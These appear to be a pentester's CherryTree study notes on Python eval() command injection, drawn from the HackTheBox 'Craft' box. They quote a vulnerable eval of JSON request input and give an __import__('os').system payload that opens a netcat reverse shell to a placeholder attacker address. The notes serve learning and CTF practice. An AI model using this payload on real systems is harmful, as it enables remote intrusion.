<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Command Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Command Injection</h1></strong><br />A mix of poorly coded python and the incorrect use of functions can lead to command injection vulnerabilities in python code.<br /><br /><strong><h2>## eval()</h2></strong><br />Great guide to exploiting <code>eval()</code> is available here<br /><a href="https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html">https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html</a><br /><br /><code>eval()</code> is a python function that will evaluate python code inside of it.<br />For example, <code>eval(1 + 2)</code> will return <code>3</code>.<br /><br />Examples<br />â€¢ <em>hackthebox Craft</em><br /><br /><strong><h3>### How is eval() vulnerable to command injection?</h3></strong><br /><em>(example from hackthebox Craft)</em><br /><br />Take, for example, this line - <code>if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]):</code><br /><br /><code>%s</code> is what allows us to inject python code.<br /><code>% requst.json[&#39;abv&#39;]</code> means that python will take the value in <code>abv</code> from your JSON request to the API, and insert it into the command at <code>%</code>.<br />For example, if you submit <code>abv = 12</code> to the API, the <code>if eval(&#39;%s &gt; 1&#39;)</code> command will become <code>if eval(&#39;12 &gt; 1&#39;)</code>.<br /><br />Because of this command injection vulnerability, we can execute unintended python code.<br /><br /><strong><h3>### What python code/command to inject?</h3></strong><br />In python, you would normally use <code>os.system(&quot;&lt;command&gt;&quot;)</code> to inject/run linux system commands.<br />Unfortunately, if the script doesn&#39;t import the <code>os</code> library, that option is unavailable to you.<br /><br />However, there&#39;s a global <code>__import__()</code> function in python that will import a library for you.<br /><code>__import__(&#39;os&#39;)</code> will import the <code>os</code> library and will return a reference to this module so that we can use it.<br /><br />For example, we could run <code>__import__(&quot;os&quot;).system(&quot;nc &lt;attacker ip&gt; &lt;attacker port&gt; -e /bin/sh&quot;)</code> which would run arbitrary python code that imports os and spawns a reverse shell that connects back to our attacking system.<br /><br /></div>
</body>
</html>
